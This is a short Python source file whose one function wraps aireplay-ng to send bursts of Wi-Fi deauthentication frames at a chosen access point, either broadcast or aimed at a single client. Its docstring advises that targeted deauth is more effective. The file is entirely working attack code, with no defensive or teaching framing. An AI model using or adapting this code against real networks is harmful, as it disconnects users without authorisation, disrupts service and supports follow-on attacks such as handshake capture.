import subprocess

from rich import print as rprint


def deauth_burst(monitor_iface, bssid, client=None, count=5):
    """
    Send a single deauth burst with aireplay-ng.

    If `client` is given, the deauth is targeted at that station (far more
    effective than broadcast — many clients/APs ignore broadcast deauth).
    Otherwise a broadcast deauth is sent to the whole AP.
    """
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(monitor_iface)

    target = f"{bssid} -> {client}" if client else f"{bssid} (broadcast)"
    rprint(f"[cyan][*] Deauth {count} pkts: {target}[/cyan]")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        if result.returncode != 0 and result.stderr.strip():
            rprint(f"[yellow][-] aireplay-ng: {result.stderr.strip()[:120]}[/yellow]")
    except subprocess.TimeoutExpired:
        rprint("[yellow][-] Deauth burst timed out.[/yellow]")
    except Exception as e:
        rprint(f"[yellow][-] Deauth error: {e}[/yellow]")
